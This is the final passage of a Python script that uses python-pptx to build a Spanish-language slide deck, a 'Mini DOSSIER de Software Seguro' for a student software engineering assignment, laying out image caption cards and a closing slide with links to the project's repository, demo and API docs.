                img_path = os.path.join(img_dir, img_name)
                if os.path.exists(img_path):
                    s.shapes.add_picture(img_path, left_p + Inches(0.2), Inches(1.5), Inches(5.2), Inches(3.8))
                
                # Texto
                tx = s.shapes.add_textbox(left_p + Inches(0.2), Inches(5.4), Inches(5.2), Inches(1.1))
                tf = tx.text_frame
                tf.word_wrap = True
                p = tf.paragraphs[0]
                p.alignment = PP_ALIGN.CENTER
                p.text = cap_t
                p.font.name = "Arial"
                p.font.size = Pt(11)
                p.font.bold = True
                p.font.color.rgb = C_TEXT_DARK
                
                p2 = tf.add_paragraph()
                p2.alignment = PP_ALIGN.CENTER
                p2.text = cap_sub
                p2.font.name = "Arial"
                p2.font.size = Pt(9.5)
                p2.font.color.rgb = C_TEXT_MUTED

        elif n == 3:
            card_w = Inches(3.7)
            for idx, (img_name, cap_t, cap_sub) in enumerate(items):
                left_p = Inches(0.8 + idx * 4.0)
                c = s.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, left_p, Inches(1.3), card_w, Inches(5.4))
                c.fill.solid()
                c.fill.fore_color.rgb = C_WHITE
                c.line.color.rgb = C_BORDER

                img_path = os.path.join(img_dir, img_name)
                if os.path.exists(img_path):
                    s.shapes.add_picture(img_path, left_p + Inches(0.15), Inches(1.5), Inches(3.4), Inches(3.6))

                tx = s.shapes.add_textbox(left_p + Inches(0.15), Inches(5.3), Inches(3.4), Inches(1.2))
                tf = tx.text_frame
                tf.word_wrap = True
                p = tf.paragraphs[0]
                p.alignment = PP_ALIGN.CENTER
                p.text = cap_t
                p.font.name = "Arial"
                p.font.size = Pt(10.5)
                p.font.bold = True
                p.font.color.rgb = C_TEXT_DARK

                p2 = tf.add_paragraph()
                p2.alignment = PP_ALIGN.CENTER
                p2.text = cap_sub
                p2.font.name = "Arial"
                p2.font.size = Pt(9)
                p2.font.color.rgb = C_TEXT_MUTED

        add_footer(s, sl_num)

    # ==========================================
    # SLIDE 24: CIERRE Y ENLACES
    # ==========================================
    s24 = prs.slides.add_slide(blank_layout)
    bg24 = s24.shapes.add_shape(MSO_SHAPE.RECTANGLE, 0, 0, Inches(13.333), Inches(7.5))
    bg24.fill.solid()
    bg24.fill.fore_color.rgb = C_NAVY_DARK
    bg24.line.fill.background()

    t24 = s24.shapes.add_textbox(Inches(1.2), Inches(1.2), Inches(10.9), Inches(2.2))
    tf24 = t24.text_frame
    tf24.word_wrap = True

    p = tf24.paragraphs[0]
    p.alignment = PP_ALIGN.CENTER
    p.text = "ENTREGA FINAL CONCLUIDA • TAREA 4.1"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.bold = True
    p.font.color.rgb = C_SKY

    p = tf24.add_paragraph()
    p.alignment = PP_ALIGN.CENTER
    p.text = "Mini DOSSIER de Software Seguro"
    p.font.name = "Arial"
    p.font.size = Pt(34)
    p.font.bold = True
    p.font.color.rgb = C_WHITE

    p = tf24.add_paragraph()
    p.alignment = PP_ALIGN.CENTER
    p.text = "Todos los componentes de código, informes SAST y suites de pruebas están disponibles en los canales oficiales:"
    p.font.name = "Arial"
    p.font.size = Pt(13)
    p.font.color.rgb = RGBColor(203, 213, 225)

    links_cards = [
        ("🐙 REPOSITORIO GITHUB", "https://github.com/GamoLG/PRACTICA-4-INGENIERIA-DE-SOFTWARE-II", "Código fuente, tests y documentación Markdown"),
        ("☁️ DEMO EN PRODUCCIÓN", "https://practica-4-ingenieria-de-software-ii.onrender.com", "Despliegue activo en la nube bajo HTTPS"),
        ("📖 SWAGGER UI (/docs)", "https://practica-4-ingenieria-de-software-ii.onrender.com/docs", "Especificación técnica interactiva OpenAPI 3.0")
    ]

    for i, (k, url, d) in enumerate(links_cards):
        left_p = Inches(1.2 + i * 3.8)
        c = s24.shapes.add_shape(MSO_SHAPE.ROUNDED_RECTANGLE, left_p, Inches(3.6), Inches(3.5), Inches(2.0))
        c.fill.solid()
        c.fill.fore_color.rgb = RGBColor(30, 41, 59)
        c.line.color.rgb = RGBColor(51, 65, 85)

        ctf = c.text_frame
        ctf.word_wrap = True
        p = ctf.paragraphs[0]
        p.text = k
        p.font.name = "Arial"
        p.font.size = Pt(11)
        p.font.bold = True
        p.font.color.rgb = C_SKY
        p.space_after = Pt(4)

        p = ctf.add_paragraph()
        p.text = url
        p.font.name = "Arial"
        p.font.size = Pt(9.5)
        p.font.bold = True
        p.font.color.rgb = C_GREEN
        p.space_after = Pt(6)

        p = ctf.add_paragraph()
        p.text = d
        p.font.name = "Arial"
        p.font.size = Pt(9)
        p.font.color.rgb = RGBColor(148, 163, 184)

    # Footer slide 24
    add_footer(s24, 24)

    output_path = "MINI_DOSSIER_SOFTWARE_SEGURO.pptx"
    prs.save(output_path)
    print(f"Presentacion creada exitosamente en {output_path}")

if __name__ == "__main__":
    create_presentation()
